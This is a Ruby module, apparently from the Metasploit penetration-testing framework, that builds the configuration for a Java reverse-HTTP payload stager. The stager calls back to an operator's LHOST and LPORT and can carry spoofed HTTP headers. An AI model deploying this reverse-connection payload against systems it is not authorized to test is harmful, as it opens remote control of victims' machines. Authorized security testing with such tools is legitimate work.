# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/uuid/options'
require 'msf/core/payload/java/payload_options'

module Msf

###
#
# Complex payload generation for Java that speaks HTTP(S)
#
###

module Payload::Java::ReverseHttp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Java
  include Msf::Payload::UUID::Options
  include Msf::Payload::Java::PayloadOptions

  #
  # Register Java reverse_http specific options
  #
  def initialize(*args)
    super
    register_advanced_options(
      [
        OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
      ] +
      Msf::Opt::http_header_options
    )
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_uri(opts={})
    ds = opts[:datastore] || datastore
    uri_req_len = ds['StagerURILength'].to_i

    # Choose a random URI length between 30 and 255 bytes
    if uri_req_len == 0
      uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
    end

    if uri_req_len < 5
      raise ArgumentError, "Minimum StagerURILength is 5"
    end

    generate_uri_uuid_mode(:init_java, uri_req_len)
  end

  #
  # Generate configuration that is to be included in the stager.
  #
  def stager_config(opts={})
    uri = generate_uri(opts)
    ds = opts[:datastore] || datastore
    c = super

    c << "HeaderUser-Agent=#{ds["HttpUserAgent"]}\n" if ds["HttpUserAgent"]
    c << "HeaderHost=#{ds["HttpHostHeader"]}\n" if ds["HttpHostHeader"]
    c << "HeaderReferer=#{ds["HttpReferer"]}\n" if ds["HttpReferer"]
    c << "HeaderCookie=#{ds["HttpCookie"]}\n" if ds["HttpCookie"]
    c << "URL=#{scheme}://#{ds['LHOST']}"
    c << ":#{ds['LPORT']}" if ds['LPORT']
    c << luri
    c << uri
    c << "\n"

    c
  end

  #
  # Scheme defaults to http
  #
  def scheme
    'http'
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end

end

end


